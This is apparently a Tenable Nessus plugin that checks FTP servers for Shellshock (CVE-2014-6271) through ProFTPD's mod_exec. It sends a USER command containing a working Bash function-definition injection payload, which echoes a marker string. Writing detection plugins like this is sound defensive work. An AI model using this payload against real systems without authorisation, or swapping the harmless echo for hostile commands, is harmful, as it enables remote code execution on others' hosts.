#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(77986);
  script_version("$Revision: 1.11 $");
  script_cvs_date("$Date: 2017/04/25 20:29:05 $");

  script_cve_id("CVE-2014-6271", "CVE-2014-7169");
  script_bugtraq_id(70103, 70137);
  script_osvdb_id(112004);
  script_xref(name:"CERT", value:"252743");
  script_xref(name:"IAVA", value:"2014-A-0142");
  script_xref(name:"EDB-ID", value:"34765");
  script_xref(name:"EDB-ID", value:"34766");
  script_xref(name:"EDB-ID", value:"34777");

  script_name(english:"GNU Bash Environment Variable Handling Code Injection via ProFTPD (Shellshock)");
  script_summary(english:"Attempts to run arbitrary code.");

  script_set_attribute(attribute:"synopsis", value:
"The remote FTP server is affected by a remote code execution
vulnerability.");
  script_set_attribute(attribute:"description", value:
"The remote FTP server is affected by a remote code execution
vulnerability due to an error in the Bash shell running on the remote
host. A remote, unauthenticated attacker can execute arbitrary code on
the remote host by sending a specially crafted request via the USER
FTP command. The 'mod_exec' module exports the attacker-supplied
username as an environment variable, which is then evaluated by Bash
as code.");
  script_set_attribute(attribute:"see_also", value:"http://www.proftpd.org/docs/contrib/mod_exec.html#ExecEnviron");
  script_set_attribute(attribute:"see_also", value:"http://seclists.org/oss-sec/2014/q3/650");
  # https://securityblog.redhat.com/2014/09/24/bash-specially-crafted-environment-variables-code-injection-attack/
  script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?dacf7829");
  script_set_attribute(attribute:"see_also", value:"https://www.invisiblethreat.ca/post/shellshock/");
  script_set_attribute(attribute:"solution", value:"Apply the referenced patch.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:C/I:C/A:C");
  script_set_cvss_temporal_vector("CVSS2#E:F/RL:OF/RC:ND");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");
  script_set_attribute(attribute:"exploit_framework_core", value:"true");
  script_set_attribute(attribute:"exploited_by_malware", value:"true");
  script_set_attribute(attribute:"metasploit_name", value:'Apache mod_cgi Bash Environment Variable Code Injection (Shellshock)');
  script_set_attribute(attribute:"exploit_framework_metasploit", value:"true");
script_set_attribute(attribute:"vuln_publication_date", value:"2014/09/24");
  script_set_attribute(attribute:"patch_publication_date", value:"2014/09/24");
  script_set_attribute(attribute:"plugin_publication_date", value:"2014/09/30");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:gnu:bash");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:proftpd:proftpd");
  script_set_attribute(attribute:"stig_severity", value:"I");
  script_set_attribute(attribute:"exploited_by_nessus", value:"true");
  script_set_attribute(attribute:"in_the_news", value:"true");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"FTP");

  script_copyright(english:"This script is Copyright (C) 2014-2017 Tenable Network Security, Inc.");

  script_dependencies("ftpserver_detect_type_nd_version.nasl", "ftp_starttls.nasl");
  script_exclude_keys("global_settings/supplied_logins_only");
  script_require_ports("Services/ftp", 21);
  script_timeout(600);

  exit(0);
}

include("acap_func.inc");
include("audit.inc");
include("byte_func.inc");
include("ftp_func.inc");
include("global_settings.inc");
include("imap_func.inc");
include("kerberos_func.inc");
include("ldap_func.inc");
include("misc_func.inc");
include("nntp_func.inc");
include("pop3_func.inc");
include("smtp_func.inc");
include("ssl_funcs.inc");
include("xmpp_func.inc");
include("telnet2_func.inc");

port = get_ftp_port(default:21);
if (supplied_logins_only) audit(AUDIT_SUPPLIED_LOGINS_ONLY);

function ftp_open(port)
{
  local_var encaps, soc;

  encaps = get_port_transport(port);
  if (encaps > ENCAPS_IP) soc = open_sock_ssl(port, encaps:encaps);
  else soc = open_sock_tcp(port);
  if (!soc) audit(AUDIT_SOCK_FAIL, port);

  # Discard banner
  ftp_recv_line(socket:soc);

  return soc;
}

# Attempt to get the service to echo something back to us, if the
# 'ExecOptions sendStdout' option is set.

echo_injection = '() { :;}; echo "NESSUS-e07ad3ba-$((17 + 12))-59f8d00f4bdf"';
echo_response = 'NESSUS-e07ad3ba-29-59f8d00f4bdf';

socket = ftp_open(port:port);

send(socket:socket, data:"USER " + echo_injection + '\r\n');
res = recv(socket:socket, length:2000, min:2000, timeout:60);

ftp_close(socket:socket);

if (echo_response >< res)
{
  report = NULL;
  if (report_verbosity > 0)
  {
    report =
      '\n' + 'Nessus was able to determine that the remote host is vulnerable to the ' +
      '\n' + 'Shellshock vulnerability by evaluating a simple math equation, injected ' +
      '\n' + 'through the ProFTPD service on port ' + port + '. The service allowed injection ' +
      '\n' + "via the '%U' mod_exec 'cookie'." +
      '\n';
  }
  security_hole(port:port, extra:report);
}
else audit(AUDIT_LISTEN_NOT_VULN, "FTP server", port);
